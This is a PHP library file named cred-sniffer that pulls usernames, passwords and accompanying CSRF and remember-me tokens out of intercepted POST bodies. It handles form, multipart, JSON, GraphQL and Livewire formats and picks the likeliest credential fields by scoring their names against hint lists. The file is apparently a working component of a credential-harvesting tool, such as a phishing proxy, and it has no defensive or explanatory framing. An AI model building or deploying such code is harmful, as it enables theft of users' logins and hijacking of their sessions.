<?php
/**
 * lib/cred-sniffer.php — Smart credential extraction from POST bodies.
 *
 * Handles: form-urlencoded, multipart/form-data, JSON, GraphQL,
 * Livewire RPC, Inertia.js, and nested structures.
 */

define('CRED_USER_HINTS', [
    'username', 'email', 'login', 'phone', 'mobile', 'handle',
    'identifier', 'uid', 'user', 'account', 'loginid', 'userid',
    'user_name', 'user_email', 'login_email', 'signin_email',
    'auth_user', 'j_username', 'session[email]', 'log', 'user_login',
]);

define('CRED_PASS_HINTS', [
    'password', 'passwd', 'pwd', 'pass', 'passw', 'secret',
    'credential', 'user_password', 'login_password', 'auth_pass',
    'j_password', 'session[password]', 'user_pass',
]);

define('CRED_NOISE_KEYS', [
    '_token', 'csrf', 'csrf_token', '_csrf', 'csrfmiddlewaretoken',
    'xsrf', '_xsrf', 'authenticity_token', '__requestverificationtoken',
    'remember', 'remember_me', 'keep_signed_in', 'stay_logged_in',
    'captcha', 'recaptcha', 'g-recaptcha-response', 'h-captcha-response',
    'honeypot', 'redirect', 'return_to', 'next', 'ref', 'referrer',
]);

/**
 * Extract credentials from a raw POST body + content-type.
 * Returns null if no password-like field found.
 */
function credsniffer_extract(string $body, string $content_type): ?array {
    if (trim($body) === '') return null;

    $ct = strtolower(explode(';', $content_type)[0] ?? '');
    $flat = [];

    switch ($ct) {
        case 'application/x-www-form-urlencoded':
            parse_str($body, $parsed);
            $flat = credsniffer_flatten($parsed);
            break;

        case 'multipart/form-data':
            $flat = credsniffer_parse_multipart($body, $content_type);
            break;

        case 'application/json':
        case 'text/json':
            $json = json_decode($body, true);
            if (!is_array($json)) return null;

            if (isset($json['query']) && is_string($json['query']) && stripos($json['query'], 'mutation') !== false) {
                $flat = credsniffer_flatten($json['variables'] ?? $json);
            } elseif (isset($json['components']) && is_array($json['components'])) {
                $flat = credsniffer_extract_livewire($json);
            } else {
                $flat = credsniffer_flatten($json);
            }
            break;

        default:
            $maybe = json_decode($body, true);
            if (is_array($maybe)) {
                $flat = credsniffer_flatten($maybe);
            } else {
                parse_str($body, $parsed);
                if (!empty($parsed)) $flat = credsniffer_flatten($parsed);
            }
    }

    if (empty($flat)) return null;
    return credsniffer_pick_creds($flat, $ct);
}

function credsniffer_flatten(array $data, string $prefix = ''): array {
    $result = [];
    foreach ($data as $k => $v) {
        $key = $prefix !== '' ? "{$prefix}.{$k}" : (string) $k;
        if (is_array($v)) {
            $result = array_merge($result, credsniffer_flatten($v, $key));
        } else {
            $result[$key] = (string) $v;
        }
    }
    return $result;
}

function credsniffer_extract_livewire(array $json): array {
    $flat = [];
    foreach ($json['components'] ?? [] as $comp) {
        foreach ($comp['updates'] ?? [] as $upd) {
            if (isset($upd['payload']['name'], $upd['payload']['value'])) {
                $flat[$upd['payload']['name']] = (string) $upd['payload']['value'];
            }
        }
        if (isset($comp['snapshot'])) {
            $snap = is_string($comp['snapshot']) ? json_decode($comp['snapshot'], true) : $comp['snapshot'];
            if (isset($snap['data']) && is_array($snap['data'])) {
                $flat = array_merge($flat, credsniffer_flatten($snap['data']));
            }
        }
    }
    return $flat;
}

function credsniffer_parse_multipart(string $body, string $ct): array {
    $flat = [];
    if (preg_match('/boundary=(.+?)(?:;|$)/i', $ct, $m)) {
        $boundary = trim($m[1], '"');
        $parts = explode('--' . $boundary, $body);
        foreach ($parts as $part) {
            if (preg_match('/name="([^"]+)"/', $part, $nm)) {
                $val = trim(substr($part, strpos($part, "\r\n\r\n") + 4));
                $val = rtrim($val, "\r\n-");
                $flat[$nm[1]] = $val;
            }
        }
    }
    return $flat;
}

function credsniffer_pick_creds(array $flat, string $source_type): ?array {
    $user_key = null; $user_val = null; $user_score = -1;
    $pass_key = null; $pass_val = null; $pass_score = -1;
    $extra = [];

    foreach ($flat as $key => $val) {
        $lower = strtolower(basename(str_replace('.', '/', $key)));

        // Score for user
        $us = credsniffer_score($lower, $val, CRED_USER_HINTS, false);
        if ($us > $user_score) { $user_score = $us; $user_key = $key; $user_val = $val; }

        // Score for pass
        $ps = credsniffer_score($lower, $val, CRED_PASS_HINTS, true);
        if ($ps > $pass_score) { $pass_score = $ps; $pass_key = $key; $pass_val = $val; }
    }

    if ($pass_key === null || $pass_val === '' || $pass_val === null) return null;

    // Collect extra fields (CSRF tokens, remember-me)
    foreach ($flat as $key => $val) {
        if ($key === $user_key || $key === $pass_key) continue;
        $lower = strtolower($key);
        foreach (CRED_NOISE_KEYS as $nk) {
            if (stripos($lower, $nk) !== false) {
                $extra[$key] = $val;
                break;
            }
        }
    }

    return [
        'user'     => $user_val,
        'pass'     => $pass_val,
        'user_key' => $user_key,
        'pass_key' => $pass_key,
        'extra'    => $extra,
        'source'   => $source_type,
    ];
}

function credsniffer_score(string $field, string $val, array $hints, bool $is_pass): int {
    $score = 0;
    foreach ($hints as $hint) {
        if ($field === $hint)          { $score = max($score, 100); break; }
        if (strpos($field, $hint) !== false) { $score = max($score, 60); }
    }
    if ($score === 0) return -1;

    // Penalize confirm/old/new password fields
    if ($is_pass) {
        if (preg_match('/confirm|verify|repeat|old|current|new/i', $field)) $score -= 30;
    }
    // Penalize empty values
    if (trim($val) === '') $score -= 200;

    return $score;
}
